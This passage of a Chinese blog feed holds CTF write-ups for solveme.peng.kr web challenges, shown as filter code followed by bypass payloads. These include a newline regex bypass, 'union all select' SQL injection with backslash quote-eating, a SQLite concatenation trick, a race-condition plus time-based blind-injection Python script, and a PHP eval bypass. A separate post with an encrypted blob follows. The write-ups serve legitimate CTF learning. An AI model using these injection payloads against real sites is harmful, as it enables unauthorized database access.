$say))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'What the f**k?'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里看学长的博客get到了新姿势，这个题目绕过的点在 <code>.*</code> 这里，这个可以匹配任意字符，但是不可以匹配换行，而 <code>^$</code> 又限制了字符串必须在同一行，所以绕过就简单了，payload</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//replacefilter.solveme.peng.kr/?say=%0agive_me_the_flag</span></span><br></pre></td></tr></table></figure>
<h1 id="Hell-JS"><a href="#Hell-JS" class="headerlink" title="Hell JS"></a>Hell JS</h1><h1 id="Anti-SQLi"><a href="#Anti-SQLi" class="headerlink" title="Anti SQLi"></a>Anti SQLi</h1><p>关键过滤如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">preg_match(</span><br><span class="line">           <span class="string">'/\.|\`|"|\'|\\|\xA0|\x0B|0x0C|\t|\r|\n|\0|'</span>.</span><br><span class="line">           <span class="string">'=|&lt;|&gt;|\(|\)|@@|\|\||&amp;&amp;|#|\/\*.*\*\/|--[\s\xA0]|'</span>.</span><br><span class="line">           <span class="string">'0x[0-9a-f]+|0b[01]+|x\'[0-9a-f]+\'|b\'[01]+\'|'</span>.</span><br><span class="line">           <span class="string">'[\s\xA0\'"]+(as|or|and|r*like|regexp)[\s\xA0\'"]+|'</span>.</span><br><span class="line">           <span class="string">'union[\s\xA0]+select|[\s\xA0](where|having)|'</span>.</span><br><span class="line">           <span class="string">'[\s\xA0](group|order)[\s\xA0]+by|limit[\s\xA0]+\d|'</span>.</span><br><span class="line">           <span class="string">'information_schema|procedure\s+analyse\s*/is'</span>,</span><br><span class="line">           $id.<span class="string">','</span>.$pw</span><br><span class="line">       ) <span class="keyword">and</span> <span class="keyword">die</span>(<span class="string">'Hack detected'</span>);</span><br></pre></td></tr></table></figure>
<p>sql语句即判断条件<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query(</span><br><span class="line">                $con, </span><br><span class="line">                <span class="string">"SELECT * FROM `antisqli` WHERE `id`='&#123;$id&#125;' AND `pw`=md5('&#123;$pw&#125;');"</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        mysqli_close($con);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($result))&#123;</span><br><span class="line">            <span class="keyword">if</span>($result[<span class="string">'no'</span>] === <span class="string">'31337'</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> $flag;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'Hello, '</span>, $result[<span class="string">'id'</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Login failed'</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
<p>该正则匹配中 <code>|\\|</code> 是无法匹配到 <code>\</code> 的，必须要用四个才可以，所以这道题目中 \ 是可以用的，用 <code>id=\</code> 可以成功吃掉一个引号。<br>正则中 <code>union[\s\xA0]+select</code> 还可考虑用 <code>union all select</code> 绕过，正则 <code>--[\s\xA0]</code> ，其中查资料发现</p>
<blockquote>
<p>\s :匹配任何不可见字符，包括空格、制表符、换页符等等。等价于[\f\n\r\t\v]</p>
</blockquote>
<p>也就是说还有其它字符可以匹配，例如 <code>%01,%11,%02</code> ，基于以上内容可以构造payload</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>\&amp;pw=<span class="class"><span class="keyword">union</span> <span class="title">all</span> <span class="title">select</span> 1222,212,12 <span class="title">from</span> <span class="title">antisqli</span>--%10</span></span><br></pre></td></tr></table></figure>
<p>最终payload</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>\&amp;pw=<span class="class"><span class="keyword">union</span> <span class="title">all</span> <span class="title">select</span> 31337,2,3 <span class="title">from</span> <span class="title">antisqli</span>--%10</span></span><br></pre></td></tr></table></figure>
<h1 id="Name-Check"><a href="#Name-Check" class="headerlink" title="Name Check"></a>Name Check</h1><p>关键过滤如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/admin|--|;|\(\)|\/\*|\\0/i"</span>, $name))</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$res = $sql-&gt;query(<span class="string">"</span></span><br><span class="line"><span class="string">            SELECT </span></span><br><span class="line"><span class="string">            MAX('0','1','&#123;$name&#125;') LIKE 'a%', </span></span><br><span class="line"><span class="string">            INSTR('&#123;$name&#125;','d')&gt;0, </span></span><br><span class="line"><span class="string">            MIN('&#123;$name&#125;','b','c') LIKE '__m__', </span></span><br><span class="line"><span class="string">            SUBSTR('&#123;$name&#125;',-2)='in'</span></span><br><span class="line"><span class="string">        ;"</span>);</span><br><span class="line">        <span class="keyword">if</span>($res === <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Database error'</span>;</span><br><span class="line">            <span class="keyword">goto</span> quit;</span><br><span class="line">        &#125;</span><br><span class="line">        $row = $res-&gt;fetchArray(SQLITE3_NUM);</span><br><span class="line">        <span class="keyword">if</span>(</span><br><span class="line">            $row[<span class="number">0</span>] + $row[<span class="number">1</span>] + $row[<span class="number">2</span>] + $row[<span class="number">3</span>] !== <span class="number">4</span> ||</span><br><span class="line">            array_sum($row) !== <span class="number">4</span> </span><br><span class="line">        )&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Auth failed'</span>;</span><br><span class="line">            <span class="keyword">goto</span> quit;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br></pre></td></tr></table></figure>
<p>看代码可知题目应该是要求四个选择条件都成立，按照题目要求应该就是输入admin才可以，但是题目过滤了admin，查阅sqlite发现，它在连接字符串的时候用的是 <code>||</code> 而不是 <code>+</code> ，所以payload： <code>?name=ad&#39;||&#39;min</code> </p>
<h1 id="I-am-slowly"><a href="#I-am-slowly" class="headerlink" title="I am slowly"></a>I am slowly</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($answer))&#123;</span><br><span class="line">    $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)</span><br><span class="line">        <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'SQL server down'</span>);</span><br><span class="line"></span><br><span class="line">    $result = mysqli_fetch_array(</span><br><span class="line">        mysqli_query($con, <span class="string">"SELECT `count` FROM `&#123;$table&#125;`;"</span>)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($result))&#123;</span><br><span class="line">        mysqli_query($con, <span class="string">"CREATE TABLE IF NOT EXISTS `&#123;$table&#125;` (`answer` char(32) NOT NULL, `count` int(4) NOT NULL);"</span>);</span><br><span class="line">        $new_answer = md5(sha1(<span class="string">'iamslowly_'</span>.mt_rand().<span class="string">'_'</span>.mt_rand().<span class="string">'_'</span>.mt_rand()));</span><br><span class="line">        mysqli_query($con, <span class="string">"INSERT INTO `&#123;$table&#125;` (`answer`,`count`) VALUES ('&#123;$new_answer&#125;',1);"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">elseif</span>($result[<span class="string">'count'</span>] === <span class="string">'12'</span>)&#123;</span><br><span class="line">        mysqli_query($con, <span class="string">"DROP TABLE `&#123;$table&#125;`;"</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Game over'</span>;</span><br><span class="line">        <span class="keyword">goto</span> quit;</span><br><span class="line">    &#125;</span><br><span class="line">    $randtime = mt_rand(<span class="number">1</span>, <span class="number">10</span>);</span><br><span class="line">    $result = mysqli_fetch_array(</span><br><span class="line">        mysqli_query($con, <span class="string">"SELECT * FROM `&#123;$table&#125;` WHERE sleep(&#123;$randtime&#125;) OR `answer`='&#123;$answer&#125;';"</span>)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($result) &amp;&amp; $result[<span class="string">'answer'</span>] === $answer)&#123;</span><br><span class="line">        mysqli_query($con, <span class="string">"DROP TABLE `&#123;$table&#125;`;"</span>);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        mysqli_query($con, <span class="string">"UPDATE `&#123;$table&#125;` SET `count`=`count`+1;"</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Go fast'</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>代码大概流程大概count=12或者table不存在的时候就建立新表重置count次数，然后知道answer相同时才会输出flag，限定了每轮只能尝试12次，之后answer就会变化且重置次数，但是题目存在逻辑漏洞，题目关键顺序是：</p>
<blockquote>
<p>判断count的值—&gt;执行SQL语句—&gt;加count值</p>
</blockquote>
<p>按照这个逻辑顺序，当count=11的时候，我们执行一个sleep()时间很长的语句，该请求就会长时间停在 <code>执行SQL语句</code> 流程中，如果此时我们再发起一次正常请求，判断count值还是11，执行完SQL语句之后count+1=12，再当上一条SQL语句执行完毕后count再加1等于13，于是之后就可以无限制提交请求了，然后在利用盲注来获得answer</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">keys = <span class="string">'0123456789abcdef'</span></span><br><span class="line">header = &#123;</span><br><span class="line"><span class="string">"Host"</span>:<span class="string">"iamslowly.thinkout.rf.gd"</span>,</span><br><span class="line"><span class="string">"Cache-Control"</span>:<span class="string">"max-age=0"</span>,</span><br><span class="line"><span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span>,</span><br><span class="line"><span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36"</span>,</span><br><span class="line"><span class="string">"Accept"</span>:<span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"</span>,</span><br><span class="line"><span class="string">"Referer"</span>:<span class="string">"http://solveme.peng.kr/chall"</span>,</span><br><span class="line"><span class="string">"Accept-Language"</span>:<span class="string">"zh-CN,zh;q=0.8"</span>,</span><br><span class="line"><span class="string">"Cookie"</span>:<span class="string">"__test=8f5247d83ccd8573674837d6f9a37fd1"</span></span><br><span class="line">&#125;</span><br><span class="line">payload = <span class="string">'440763269e2fe7a672a52ea827728'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> keys:</span><br><span class="line">        url = <span class="string">"http://iamslowly.thinkout.rf.gd/?i=1&amp;answer=' or if((answer like '&#123;&#125;%'),sleep(50),2)%23"</span>.format(payload + j)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content = requests.get(url,headers=header,timeout=<span class="number">30</span>).content</span><br><span class="line">            print(content[:<span class="number">10</span>])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            payload += j</span><br><span class="line">            print(payload)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>这题目盲注时间有点长，这里贴一下结果 <code>440763269e2fe7a672a52ea827728539</code> 。</p>
<h1 id="Check-via-eval"><a href="#Check-via-eval" class="headerlink" title="Check via eval"></a>Check via eval</h1><p>主要代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$exam = <span class="string">'return\''</span>.sha1(time()).<span class="string">'\';'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="./?flag='</span>.$exam.<span class="string">'"&gt;Click here&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'flag'</span>]) != strlen($exam)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Not allowed length'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">'/`|"|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is'</span>, $_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Not allowed keyword'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">eval</span>($_GET[<span class="string">'flag'</span>]) === sha1($flag)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目过滤了括号，也基本过滤完了能用的函数，所以思路就是在 <code>eval($_GET[&#39;flag&#39;])</code> 中让其直接输出flag，虽然题目过滤了flag，但是PHP文档中有如下内容 <a href="http://php.net/manual/zh/language.basic-syntax.phpmode.php" target="_blank" rel="noopener">Click Here</a> ，也就是说可以用 <code>&lt;?= expression?&gt;</code> 来达到绕过 <code>echo</code> 过滤的目的。</p>
<p>我们可以构造 <code>&lt;?= flag?&gt;</code> 来输出flag，尝试构造payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="string">'alag'</span>;$a&#123;<span class="number">0</span>&#125;=<span class="string">'f'</span>;<span class="meta">?&gt;</span><span class="number">11111111111111111</span>;<span class="meta">&lt;?</span>=$$a;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[萌宠养成记]]></title>
      <url>/2018/07/24/Train-my-pet/</url>
      <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script>
<div id="hbe-security">
  <div class="hbe-input-container">
  <input type="password" class="hbe-form-control" id="pass" placeholder="What's my pet's name?" />
    <label for="pass">What's my pet's name?</label>
    <div class="bottom-line"></div>
  </div>
</div>
<div id="decryptionError" style="display: none;">Incorrect Password!</div>
<div id="noContentError" style="display: none;">No content to display!</div>
<div id="encrypt-blog" style="display:none">
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